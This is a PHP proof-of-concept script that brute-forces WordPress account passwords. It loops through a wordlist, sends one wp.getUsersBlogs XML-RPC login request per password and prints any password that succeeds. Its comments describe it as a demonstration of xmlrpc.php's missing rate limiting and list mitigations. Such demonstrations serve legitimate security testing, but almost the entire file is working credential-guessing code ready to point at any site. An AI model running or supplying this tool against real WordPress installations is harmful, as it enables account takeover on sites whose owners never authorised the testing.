#!/usr/bin/env php
<?php
//
// PoC: WordPress xmlrpc.php wp.getUsersBlogs password brute force
// PHP-translation of Perl (RPC::XML::Client)
//
// Usage:   php xmlrpc-bruteforce.php -t <url-to-xmlrpc.php> -u <username>
// Example: php xmlrpc-bruteforce.php -t http://localhost/wordpress/xmlrpc.php -u admin
// With a passwords.txt in the same directory.
// To prove the PoC locally: set up a test installation with a known password that is included in the list.
// The script should then print password found: <password>.
// This demonstrates the vulnerability:
//  - that xmlrpc.php allows unlimited authentication brute-force attempts without rate limiting via wp.getUsersBlogs
//  - the recommended mitigation is to disable XML-RPC or block system.multicall/XML-RPC authentication in the WAF or by using the xmlrpc_enabled filter.
//

$options = getopt('t:u:');

if (!isset($options['t']) || !isset($options['u'])) {
    echo "not all flags defined:\n -t, -u are mandatory.\n";
    echo "  -t: URL to xmlrpc.php of the wordpress-installation\n";
    echo "  -u: target username for example admin\n";
    exit(1);
}

$target   = $options['t'];
$username = $options['u'];
$filename = 'passwords.txt';

$fh = @fopen($filename, 'r');
if ($fh === false) {
    die("Could not open file '$filename'\n");
}

$x = 0;

while (($row = fgets($fh)) !== false) {
    $password = rtrim($row, "\r\n");
    $body = xmlrpc_encode_request('wp.getUsersBlogs', array($username, $password));
    $ch = curl_init($target);
    curl_setopt_array($ch, array(
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => array('Content-Type: text/xml'),
        CURLOPT_POSTFIELDS     => $body,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
    ));
    $response = curl_exec($ch);
    $curl_err = curl_error($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response === false) {
        die("Request failed: $curl_err\n");
    }

    if (strpos($response, 'faultString') === false) {
        echo "\n";
        die("password found: $password\n");
    }

    if (strpos($response, 'Incorrect username or password.') === false
        && strpos($response, 'Invalid username') === false) {
        echo "\n[!] Unexpected responese (needs manual verification):\n$response\n";
    }

    $x++;
    if ($x % 10 === 0) {
        echo $x;
    }
}

fclose($fh);

echo "\n";
echo "All passwords in file used, no successful password found\n";

// ---------------------------------------------------------------------
// Simple XML-RPC-encoder (system.methodSignature: string, string, string)
// RPC::XML's automatic serialization of params.
// ---------------------------------------------------------------------
function xmlrpc_encode_request($method, $params)
{
    $xml = '<?xml version="1.0"?>' . "\n";
    $xml .= '<methodCall>' . "\n";
    $xml .= '<methodName>' . htmlspecialchars($method, ENT_XML1) . '</methodName>' . "\n";
    $xml .= '<params>' . "\n";
    foreach ($params as $p) {
        $xml .= '<param><value><string>'
             . htmlspecialchars($p, ENT_XML1)
             . '</string></value></param>' . "\n";
    }
    $xml .= '</params>' . "\n";
    $xml .= '</methodCall>';
    return $xml;
}

